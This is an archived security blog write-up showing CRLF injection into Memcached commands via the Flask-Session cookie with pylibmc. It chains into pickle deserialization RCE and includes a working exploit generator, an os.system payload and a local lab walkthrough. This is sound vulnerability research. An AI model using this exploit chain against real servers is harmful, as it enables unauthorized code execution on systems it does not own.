---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2023-02-04_memcached-command-injections-at-pylibmc.md
original_filename: 2023-02-04_memcached-command-injections-at-pylibmc.md
title: Memcached Command Injections at Pylibmc
category: documents
detected_topics:
- command-injection
- ssrf
- automation-abuse
- api-security
- supply-chain
tags:
- imported
- documents
- command-injection
- ssrf
- automation-abuse
- api-security
- supply-chain
language: en
raw_sha256: eb44ff3232484447fc3096f2a3cfa6af4488a28488f601b83188ce48883c8008
text_sha256: eeaaefc8bbc7786b7684ec7a1097cd29981e4fc3afd7cd3b0f28756f5d8d6863
ingested_at: '2026-06-28T07:32:17Z'
sensitivity: unknown
redactions_applied: false
---

# Memcached Command Injections at Pylibmc

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2023-02-04_memcached-command-injections-at-pylibmc.md
- Source Type: markdown
- Detected Topics: command-injection, ssrf, automation-abuse, api-security, supply-chain
- Ingested At: 2026-06-28T07:32:17Z
- Redactions Applied: False
- Raw SHA256: `eb44ff3232484447fc3096f2a3cfa6af4488a28488f601b83188ce48883c8008`
- Text SHA256: `eeaaefc8bbc7786b7684ec7a1097cd29981e4fc3afd7cd3b0f28756f5d8d6863`


## Content

---
title: "Memcached Command Injections at Pylibmc"
page_title: "Memcached Command Injections at Pylibmc · D4D blog"
url: "https://btlfry.gitlab.io/notes/posts/memcached-command-injections-at-pylibmc/"
final_url: "https://btlfry.gitlab.io/notes/posts/memcached-command-injections-at-pylibmc/"
authors: ["Zakhar Fedotkin / d4d (@d4d89704243)"]
programs: ["Flask-Session"]
bugs: ["CRLF injection", "Memcached command injection", "Insecure deserialization", "RCE"]
publication_date: "2023-02-04"
added_date: "2024-01-29"
source: "pentester.land/writeups.json"
original_index: 1577
---

# Memcached Command Injections at Pylibmc

Sat, Feb 4, 2023

The recent rise of Apache Airflow CVE-2020-17526 vulnerabilities bring my attention to the flask session signing algorythm. My search of common flask’s default secrets at GitHub broght me to one interesting library [Flask_Session](https://flask-session.readthedocs.io/en/latest/). Flask-Session is an extension for [Flask](https://flask.palletsprojects.com/en/2.2.x/) that adds support for Server-side Session to the application. It allows you to use Redis, Memcached key-value store as a session backend. By default python pickle library used for data serialization. Which reminded me of an interesting research.

In 2014, Ivan Novikov presented a [Memcached injection techniques](https://www.blackhat.com/docs/us-14/materials/us-14-Novikov-The-New-Page-Of-Injections-Book-Memcached-Injections-WP.pdf) at Black Hat USA. It was mentioned that Memcached injection can be used to get Remote Code Execution at vulnerable application in case of the data deserialization. Lately it was shown that vBulletin before version 4.2.2 had a Memcache Remote Code Execution via SSRF by arbitrary serialized data injection into Memcached.

### Memcached injection techniques

Memcached is a distributed memory caching system. It is in great demand in bigdata Internet projects as it allows reasonably speed up web applications by caching data in RAM. At Flask world cached data often includes user sessions. Memcached supports both plaintext and binary protocols. Commands and data sequences terminated by CRLF at Memcached. The simplest vector of exploitation is CRLF injection in the command argument. For example, as the name attribute for the command “set”.

Common Memcache Commands are

Command | Format  
---|---  
set | set <key> <flags> <expiry> <datalen> [noreply]\r\n<data>\r\n  
get | get <key> [<key>]+\r\n  
  
  * Where,
  * <flags> \- uint32_t : data specific client side flags
  * <expiry> \- uint32_t : expiration time (in seconds)
  * <datalen> \- uint32_t : size of the data (in bytes)
  * <data> \- uint8_t[]: data block

### Demo application

There is a [demo application](https://github.com/d0ge/proof-of-concept-labs/tree/main/pylibmc-flask-session) that can be used to play with vulnerability localy. Docker is required to run the PoC: `docker-compose -f compose.yaml up`. Visit `http://127.0.0.1:8000/set/?key=value` to start.

### Exploitation

Lets take a look at Flask-Session function `save_session` that is responsible for session storage at Memcached:
  
  
  full_session_key = self.key_prefix + session.sid
  
  if not PY2:
  val = self.serializer.dumps(dict(session), 0)
  else:
  val = self.serializer.dumps(dict(session))
  self.client.set(full_session_key, val, self._get_memcache_timeout(
  total_seconds(app.permanent_session_lifetime)))
  

Variable `full_session_key` is a concatenation of strings: prefix and session cookie value. This function is vulnerable to the Memcached command injection at cookie with CRLF technic. However, we have one obstacle - special charecters are difficult to set into Http header. To solve this problem lets take a look at RFC2068:
  
  
  Many HTTP/1.1 header field values consist of words separated by LWS
  or special characters. These special characters MUST be in a quoted
  string to be used within a parameter value.
  

This logic is implemented at cookies processing function:
  
  
  These quoting routines conform to the RFC2109 specification, which in
  turn references the character definitions from RFC2068.  They provide
  a two-way quoting algorithm.  Any non-text character is translated
  into a 4 character sequence: a forward-slash followed by the  
  three-digit octal equivalent of the character.  Any '\' or '"' is
  quoted with a preceeding '\' slash.
  
  Check for special sequences.  Examples:
  \012 --> \n
  \"  --> "
  

By using quoted string we can encode `\r\n` charecters into `\015\012` string. Let me remind you that python pickle library is used to deserialise session data before saving it into Memcached. This means that we can convert a stream of bytes into a Python object and get remote code execution. Simpliest exploit of pickle data deserialization by `__reduce__` method shown below
  
  
  import pickle
  import os
  
  class RCE:
  def __reduce__(self):
  cmd = ('ping -c 1 localhost')
  return os.system, (cmd,)
  
  def generate_exploit():
  payload = pickle.dumps(RCE(), 0)
  payload_size = len(payload)
  cookie = b'137\r\nset BT_:1337 0 2592000 '
  cookie += str.encode(str(payload_size))
  cookie += str.encode('\r\n')
  cookie += payload
  cookie += str.encode('\r\n')
  cookie += str.encode('get BT_:1337')
  
  pack = ''
  for x in list(cookie):
  if x > 64:
  pack += oct(x).replace("0o","\\")
  elif x < 8:
  pack += oct(x).replace("0o","\\00")
  else:
  pack += oct(x).replace("0o","\\0")
  
  return f"\"{pack}\""
  

Our command injection at plain text Memcached protocol shown at Wireshark stream: ![Wireshark stream](https://btlfry.gitlab.io/notes/images/wireshark-memcached.png)

### Exploitation

Let’s put it all together.

  1. Set session cookie `notsecret` value with CRLF injection.

![Memcached injection](https://btlfry.gitlab.io/notes/images/memcached-rce-1.png)

  2. Get memcached key with cookie `notsecret=1337`

![Remote code execution](https://btlfry.gitlab.io/notes/images/memcached-rce-3.png)

  3. Localhost ping can be found at console output

![Pickle data deserialization](https://btlfry.gitlab.io/notes/images/memcached-rce-2.png)
  
  
  PING localhost (127.0.0.1): 56 data bytes
  64 bytes from 127.0.0.1: seq=0 ttl=64 time=0.032 ms
  localhost ping statistics
  

### Supporting Material/References:

  * [SSRF, Memcached and other key-value injections in the wild](https://d0znpp.medium.com/ssrf-memcached-and-other-key-value-injections-in-the-wild-c8d223bd856f)
  * [Exploiting Python pickles](https://davidhamann.de/2020/04/05/exploiting-python-pickle/)
